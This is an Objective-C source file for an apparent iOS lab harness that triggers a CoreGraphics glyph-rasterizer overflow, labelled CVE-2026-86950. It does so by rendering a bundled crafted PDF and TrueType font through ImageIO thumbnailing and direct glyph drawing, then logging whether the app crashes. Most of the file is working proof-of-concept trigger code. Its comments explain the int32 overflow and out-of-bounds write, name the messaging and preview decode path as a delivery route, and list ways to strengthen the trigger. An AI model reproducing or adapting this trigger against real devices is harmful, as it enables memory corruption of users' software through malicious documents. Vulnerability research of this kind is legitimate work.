//
//  P076GlyphProbe.m
//  P007OpenOnly — CVE-2026-86950 on-device trigger (v1).
//
//  Harness mirrors calif.io render.c: CGImageSourceCreateThumbnailAtIndex
//  over a PDF (ImageIO decode path — no explicit CGContext, ImageIO's own
//  internal render context reaches CGGlyphBitmapCreateWithPathAndDilation
//  with the vulnerable 0x30000 flags-clear config).
//
//  Sequence:
//    1. CONTROL: minimal benign PDF (Helvetica base-14, no embedded font)
//       through the same thumbnail API. Survives on every build — proves
//       the in-app decode path works and isolates the trigger variable.
//    2. TRIGGER: bundled p076_trigger.pdf (califio/publications trigger:
//       leaf glyph + 2-pt line at x=32000, 9-level composite chain
//       scaling ~2x each, Tf=1024, upm=16384 -> device x ~1M ->
//       4096*1M overflows int32; moveto saturates, lineto truncates).
//    3. Log the last line BEFORE the trigger render. If the app dies
//       there (EXC_BAD_ACCESS in aa_cache_render), the recovery packet
//       is the proof: CVE live on 23F77.
//
//  One TAP per force-quit. Per-line POSIX write + F_FULLFSYNC.
//

#import "P076GlyphProbe.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define P076_BUILD @"p076-glyph-v2"

static int g_p076_fd = -1;
static NSMutableString *g_p076_buf;
static BOOL g_p076_trigger = YES;

static void p076_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P076GlyphProbe class]) {
        if (g_p076_buf) [g_p076_buf appendString:out];
        if (g_p076_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p076_fd, s, strlen(s));
                fcntl(g_p076_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - PDF render helpers

static CGImageRef p076_thumbnail(NSData *pdfData, NSString **errOut) {
    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)pdfData, NULL);
    if (!src) { *errOut = @"CGImageSourceCreateWithData failed"; return NULL; }
    int sz = 256;
    CFNumberRef maxPx = CFNumberCreate(NULL, kCFNumberIntType, &sz);
    const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                           kCGImageSourceThumbnailMaxPixelSize };
    const void *vals[] = { kCFBooleanTrue, maxPx };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
    CFRelease(opts);
    CFRelease(maxPx);
    CFRelease(src);
    return img;
}

/* minimal benign PDF: one page, Helvetica base-14 text (no embedded font) */
static NSData *p076_control_pdf(void) {
    const char *stream = "BT /F1 24 Tf 10 100 Td (P007 control) Tj ET\n";
    char buf[1024];
    int n = snprintf(buf, sizeof(buf),
        "%%PDF-1.4\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
        "/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"
        "4 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n"
        "5 0 obj\n<< /Length %zu >>\nstream\n%s" "endstream\nendobj\n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\n%%%%EOF\n",
        strlen(stream), stream);
    return [NSData dataWithBytes:buf length:n];
}

@implementation P076GlyphProbe

/* full run: control + both trigger stages (86950 test) */
+ (NSString *)tap {
    g_p076_trigger = YES;
    return [P076GlyphProbe run];
}

/* control-only: same console flow, NO trigger renders.
   Discriminator for the 13:08:38 AttributeGraph crash. */
+ (NSString *)tapControlOnly {
    g_p076_trigger = NO;
    return [P076GlyphProbe run];
}

+ (NSString *)run {
    g_p076_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p076_glyph_probe_log.txt"];
    g_p076_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p076_log(@"=== p076 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P076_BUILD);
    p076_log(@"CVE-2026-86950 glyph trigger (calif.io). CoreGraphics aa_double_to_fixed:");
    p076_log(@"aa_moveto FCVTZS Wd saturates vs aa_lineto FCVTZS 2D+XTN truncates ->");
    p076_log(@"bbox wrap -> undersized coverage buffer -> OOB u16 increments.");
    p076_log(@"Fixed in 26.7.1. This device 23F77 = 26.5 -> candidate UNPATCHED.");
    p076_log(@"CONTROL (benign Helvetica PDF) first, then TRIGGER (bundled crafted");
    p076_log(@"PDF via ImageIO thumbnail = WhatsApp/QuickLook decode path).");
    p076_log(@"IF THIS SESSION ENDS RIGHT AFTER THE TRIGGER LINE WITH NO SURVIVED");
    p076_log(@"LINE, THE CRASH IS THE FINDING. Honesty: userspace OOB in OUR");
    p076_log(@"process — NOT kernel, NOT KRW. Conversion bar untouched.");
    p076_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p076"];
    if (stop) {
        p076_log(@"%@", stop);
        if (g_p076_fd >= 0) { fcntl(g_p076_fd, F_FULLFSYNC); close(g_p076_fd); g_p076_fd = -1; }
        NSString *ret = g_p076_buf; g_p076_buf = nil; return ret;
    }
    p076_log(@"%@", [LabDeviceProfile identBlock]);

    [[P007Board shared] recordEvent:@"p076_session" kind:@"arm"
                             detail:@"86950 glyph probe armed" source:@"p076"];

    /* ---- CONTROL: benign PDF through the same path ---- */
    NSData *ctrl = p076_control_pdf();
    NSString *cerr = nil;
    CGImageRef cimg = p076_thumbnail(ctrl, &cerr);
    if (cimg) {
        size_t w = CGImageGetWidth(cimg), h = CGImageGetHeight(cimg);
        CGImageRelease(cimg);
        p076_log(@"[+] CONTROL survived: thumbnail %zux%zu — ImageIO decode path OK in-app", w, h);
        [[P007Board shared] recordEvent:@"p076_session" kind:@"control_ok"
                                 detail:[NSString stringWithFormat:@"%zux%zu", w, h]
                                 source:@"p076"];
    } else {
        p076_log(@"[-] CONTROL failed: %@ — path broken, trigger result would be meaningless", cerr ?: @"?");
        p076_log(@"=== VERDICT === inconclusive (control failed). hasKread=NO.");
        if (g_p076_fd >= 0) { fcntl(g_p076_fd, F_FULLFSYNC); close(g_p076_fd); g_p076_fd = -1; }
        NSString *ret = g_p076_buf; g_p076_buf = nil; return ret;
    }

    /* ---- TRIGGER stage 1: bundled crafted PDF (ImageIO thumbnail path) ---- */
    if (!g_p076_trigger) {
        p076_log(@"[*] CONTROL-ONLY tap: trigger stages skipped. If THIS tap still ends");
        p076_log(@"    in an AttributeGraph crash (AG::Graph::value_mark, NULL+0x118), the");
        p076_log(@"    13:08:38 crash was a display bug — 86950 NOT implicated. If this tap");
        p076_log(@"    survives where the trigger tap crashed, the OOB landed in mapped heap");
        p076_log(@"    and detonated later = deferred corruption = 86950 firing silently.");
    } else {
    NSURL *turl = [[NSBundle mainBundle] URLForResource:@"p076_trigger" withExtension:@"pdf"];
    NSData *trig = turl ? [NSData dataWithContentsOfURL:turl] : nil;
    if (!trig || trig.length < 100) {
        p076_log(@"[-] p076_trigger.pdf not in bundle (len=%lu) — abort", (unsigned long)trig.length);
        p076_log(@"=== VERDICT === abort (resource). hasKread=NO.");
        if (g_p076_fd >= 0) { fcntl(g_p076_fd, F_FULLFSYNC); close(g_p076_fd); g_p076_fd = -1; }
        NSString *ret = g_p076_buf; g_p076_buf = nil; return ret;
    }
    p076_log(@"[+] trigger PDF loaded (%lu bytes)", (unsigned long)trig.length);
    p076_log(@">>> TRIGGER-1: ImageIO thumbnail over crafted font —");
    p076_log(@"    crash on this line = CVE-2026-86950 LIVE on 23F77 (ImageIO path)");
    NSString *terr = nil;
    CGImageRef timg = p076_thumbnail(trig, &terr);
    if (timg) {
        CGImageRelease(timg);
        p076_log(@"[*] T1 SURVIVED: thumbnail rendered. ImageIO path gated or insufficient");
        p076_log(@"    magnification on iOS 26.5 — falling through to the direct harness.");
    } else {
        p076_log(@"[*] T1 thumbnail NULL without crash: %@ (decode rejected pre-raster)", terr ?: @"?");
    }

    /* ---- TRIGGER stage 2: direct-font harness (calif article path) ----
       CGFontCreateWithDataProvider + CGContextShowGlyphsAtPositions at
       Tf 1024 reaches CGGlyphBitmapCreateWithPathAndDilation with the
       0x30000-flags-clear config — the exact path in the calif lldb bt. */
    NSURL *furl = [[NSBundle mainBundle] URLForResource:@"p076_trigger" withExtension:@"ttf"];
    NSData *ttf = furl ? [NSData dataWithContentsOfURL:furl] : nil;
    if (!ttf || ttf.length < 100) {
        p076_log(@"[-] p076_trigger.ttf not in bundle — abort");
        p076_log(@"=== VERDICT === abort (resource). hasKread=NO.");
        if (g_p076_fd >= 0) { fcntl(g_p076_fd, F_FULLFSYNC); close(g_p076_fd); g_p076_fd = -1; }
        NSString *ret = g_p076_buf; g_p076_buf = nil; return ret;
    }
    CGDataProviderRef tdp = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf);
    CGFontRef tfont = tdp ? CGFontCreateWithDataProvider(tdp) : NULL;
    if (!tfont) {
        p076_log(@"[-] CGFontCreateWithDataProvider FAILED on trigger.ttf");
        if (tdp) CFRelease(tdp);
        p076_log(@"=== VERDICT === abort (font load). hasKread=NO.");
        if (g_p076_fd >= 0) { fcntl(g_p076_fd, F_FULLFSYNC); close(g_p076_fd); g_p076_fd = -1; }
        NSString *ret = g_p076_buf; g_p076_buf = nil; return ret;
    }
    p076_log(@"[+] trigger.ttf loaded (%lu bytes, glyph 'A')", (unsigned long)ttf.length);
    CGGlyph tglyph = CGFontGetGlyphWithGlyphName(tfont, CFSTR("A"));
    CGContextRef tctx = CGBitmapContextCreate(NULL, 64, 64, 8, 64,
                                              CGColorSpaceCreateDeviceGray(),
                                              kCGImageAlphaNone);
    CGContextSetShouldSmoothFonts(tctx, false);
    CGContextSetFont(tctx, tfont);
    CGContextSetFontSize(tctx, 1024);
    CGPoint tpos = CGPointZero;
    p076_log(@">>> TRIGGER-2: direct CGContextShowGlyphsAtPositions Tf=1024 —");
    p076_log(@"    crash on this line = CVE-2026-86950 LIVE on 23F77 (direct path)");
    CGContextShowGlyphsAtPositions(tctx, &tglyph, &tpos, 1);

    /* --- only reached if neither stage crashed --- */
    p076_log(@"[*] T2 SURVIVED: direct render completed without fault.");
    CGContextRelease(tctx);
    CFRelease(tfont);
    if (tdp) CFRelease(tdp);
    } /* end g_p076_trigger */

    p076_log(@"=== VERDICT ===");
    if (g_p076_trigger) {
        p076_log(@"No crash on either stage = inconclusive. Candidates: (a) CG on 26.5");
        p076_log(@"already carries the clamp (would contradict 26.5<26.7.1 advisory),");
        p076_log(@"(b) magnification insufficient on device (composite chain clamped),");
        p076_log(@"(c) rasterizer uses the sat-consistent variant here.");
        p076_log(@"NEXT levers: larger Tf (ripc gate is ~1024 per calif), deeper composite");
        p076_log(@"chain, PDF text-matrix scaling on top of Tf, or disassemble the device");
        p076_log(@"aa_moveto/aa_lineto to confirm FCVTZS divergence on 23F77.");
    } else {
        p076_log(@"Control-only run complete. Compare against the 13:08:38 crash:");
        p076_log(@"this tap WITHOUT trigger crashing in AttributeGraph = display bug;");
        p076_log(@"this tap surviving while the trigger tap crashed = the 86950 OOB");
        p076_log(@"landed in mapped heap and detonated later (deferred corruption).");
    }
    p076_log(@"Crash signature if a stage died: EXC_BAD_ACCESS in aa_cache_render,");
    p076_log(@"ldrh w8,[x30] — per calif backtrace. Userspace only; NOT KRW.");
    p076_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit.");

    if (g_p076_fd >= 0) { fcntl(g_p076_fd, F_FULLFSYNC); close(g_p076_fd); g_p076_fd = -1; }
    NSString *ret = g_p076_buf;
    g_p076_buf = nil;
    return ret;
}

@end